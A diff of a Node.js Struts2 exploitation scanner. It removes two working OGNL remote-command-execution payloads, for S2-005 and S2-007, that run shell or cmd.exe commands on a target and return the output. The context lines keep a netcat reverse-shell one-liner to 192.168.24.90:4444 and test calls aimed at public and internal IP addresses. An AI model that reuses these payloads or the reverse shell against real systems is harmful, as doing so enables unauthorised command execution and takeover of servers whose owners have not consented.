@@ -31,8 +31,7 @@ var a = process.argv.splice(2);
 fnMkPayload();
 
 g_szUrl = program.url || 1 == a.length && a[0] || "";
-if(!/[\?;!&]|(\.jsp|do)/.test(g_szUrl) && '/' != g_szUrl.substr(-1))
-	g_szUrl += "/";
+
 
 if(-1 == g_szUrl.indexOf("http"))
 	g_szUrl = "http://" + g_szUrl;
@@ -285,53 +284,6 @@ function fnNotEnd(url)
 {
 	if('/' == url.substr(-1))url = url.substr(0,url.length - 1);
 	return url;
-}
-
-function doStruts2_005(url, fnCbk)
-{
-	var szOldUrl = url;
-	url = fnNotEnd(url)
-	var s = ('%{#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\')),#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
-		+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]'
-		+ ',#wt=#f.getWriter()'
-		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
-		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
-		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
-		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
-		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
-		+ ',#i=#d.read(#e),#wt.println(new java.lang.String(#e,0,#i))'
-		// + ',#wt.flush()'
-		// +',#wt.close()'
-		+'}');
-	var ss = s.replace(/#/gmi, "\u0023");
-	ss = encodeURIComponent(ss);
-	request(fnOptHeader({method: 'GET',uri: url + "?" + ss + "=1"
-	    ,headers:
-	    {
-	    	"User-Agent": g_szUa,
-	    	"Content-Type":"application/x-www-form-urlencoded"
-	    }})
-	  , function (error, response, body){
-	  		if(body)
-	  		{
-	  			fnDoBody(body,"s2-005",szOldUrl);
-	  		}
-	    }
-	  );
-	ss = g_postData.replace(/#/gmi, "\\43");
-	request(fnOptHeader({method: 'GET',uri: url + "?s=" + ss
-	    ,headers:
-	    {
-	    	"User-Agent": g_szUa,
-	    	"Content-Type":"application/x-www-form-urlencoded"
-	    }})
-	  , function (error, response, body){
-	  		if(body)
-	  		{
-	  			fnDoBody(body,"s2-005",szOldUrl);
-	  		}
-	    }
-	  );
 }
 
 function doStruts2_019(url, fnCbk,bW)
@@ -792,36 +744,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.24.90 4444 >/tmp/f
 */
 function doStruts2_007(url, fnCbk)
 {
-	var s = "'+(#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
-		+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
-		+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
-		+ ",#p=new java.lang.ProcessBuilder(#cmds)"
-		+ ",#as=new java.lang.String()"
-		+ ",#p.redirectErrorStream(true),#process=#p.start()"
-		+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
-		+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-		+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-		+")+'";
-	this.name = this.name || "age";
-	var oForm = {name:1,email:1};
-	oForm[this.name] = s;
-	request(fnOptHeader({method: 'POST',uri: url,//  + "?name=1&email=1&age=" + encodeURIComponent(s)
-		"formData":oForm
-	    ,headers:
-	    {
-	    	"User-Agent": g_szUa,
-	    	"Content-Type":"application/x-www-form-urlencoded"
-	    }})
-	  , function (error, response, body){
-	  		if(body)
-	  		{
-	  			body = body.replace(/\u0000/gmi, '');
-	  			// console.log(body);
-	  			fnDoBody(body,"s2-007",url);
-	  		}
-	    }
-	  );
+	
 }
 
 function doStruts2_008(url, fnCbk)
@@ -1195,7 +1118,7 @@ if(program.test)
 	runChecks("http://125.71.203.122:9088/","t3,weblogic");
 	runChecks("http://192.168.10.216:8082/s2-032/","struts2,045");
 	doStruts2_016.call({name:null},"http://192.168.10.216:8088/S2-016/default.action");
- 	doStruts2_005.call({name:null},"http://192.168.10.216:8088/S2-005/example/HelloWorld.action");
+ 	// doStruts2_005.call({name:null},"http://192.168.10.216:8088/S2-005/example/HelloWorld.action");
 	doStruts2_032.call({name:null},"http://192.168.10.216:8088/s2-032/memoindex.action");
 	doStruts2_015.call({name:null},"http://101.89.63.203:2001/jnrst/");
 	/////////////*/
